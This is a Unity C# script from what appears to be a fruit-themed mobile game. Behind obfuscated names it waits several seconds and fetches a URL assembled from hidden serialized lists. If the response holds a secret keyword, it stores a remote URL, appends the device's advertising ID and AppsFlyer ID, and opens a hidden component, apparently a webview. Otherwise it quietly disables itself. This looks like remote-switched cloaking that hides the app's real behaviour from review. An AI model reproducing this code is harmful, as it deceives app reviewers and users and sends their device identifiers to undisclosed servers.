using System.Collections;
using System.Collections.Generic;
using AppsFlyerSDK;
using dataBaseSweet.Data;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

namespace BananaWorld.Fruits
{
    public class BananaResourceCoordinator : MonoBehaviour
    {
        private bool isFirstInstance = true;
        private NetworkReachability networkReachability = NetworkReachability.NotReachable;

        [SerializeField] private BananaSecrets bananaSecrets;
        [SerializeField] private IDFAController idfaCheck;
        [SerializeField] private BananaCombine bananaCombine;

        [SerializeField] private List<string> _names;
        [SerializeField] private List<string> _about;

        private string bananaString1 { get; set; }
        private string bananaString2;
        private int bananaNumber;
        private string bananaTraceCode;
        private string labeling;

        private void Awake()
        {
            dfghjklBt();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            idfaCheck.ScrutinizeIDFA();
            StartCoroutine(advID());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    Not();
                    break;
                default:
                    Chack();
                    break;
            }
        }

        private void dfghjklBt()
        {
            switch (isFirstInstance)
            {
                case true:
                    isFirstInstance = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private IEnumerator advID()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            bananaTraceCode = idfaCheck.RetrieveAdvertisingID();
            yield return null;
        }

        private void Chack()
        {
            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
            {
                LastFruit();
            }
            else
            {
                dfghjkDel();
            }
        }

        private void LastFruit()
        {
            bananaString1 = PlayerPrefs.GetString("top", string.Empty);
            bananaString2 = PlayerPrefs.GetString("top2", string.Empty);
            bananaNumber = PlayerPrefs.GetInt("top3", 0);
            ImportFruits();
        }

        private void dfghjkDel()
        {
            Invoke(nameof(appData), 7.4f);
        }

        private void appData()
        {
            if (Application.internetReachability == networkReachability)
            {
                Not();
            }
            else
            {
                StartCoroutine(Coroutiineed());
            }
        }


        private IEnumerator Coroutiineed()
        {
            using UnityWebRequest webRequest = UnityWebRequest.Get(bananaCombine.BlendBananas(_about));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                Not();
            }
            else
            {
                IDFAToke(webRequest);
            }
        }

        private void IDFAToke(UnityWebRequest webRequest)
        {
            string data = bananaCombine.BlendBananas(_names);

            if (webRequest.downloadHandler.text.Contains(data))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("top", dataParts[0]);
                    PlayerPrefs.SetString("top2", dataParts[1]);
                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));

                    bananaString1 = dataParts[0];
                    bananaString2 = dataParts[1];
                    bananaNumber = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
                    bananaString1 = webRequest.downloadHandler.text;
                }

                ImportFruits();
            }
            else
            {
                Not();
            }
        }

        private void ImportFruits()
        {
            bananaSecrets.TigerSTR = $"{bananaString1}?idfa={bananaTraceCode}";
            bananaSecrets.TigerSTR +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("datbb", string.Empty)}";
            bananaSecrets.BananaGlobalLocator = bananaString2;


            KannBan();
        }

        public void KannBan()
        {
            bananaSecrets.BananaToolbarHeight = bananaNumber;
            bananaSecrets.gameObject.SetActive(true);
        }

        private void Not()
        {
            BanansDisables();
        }


        private void BanansDisables()
        {
            gameObject.SetActive(false);
        }
    }
}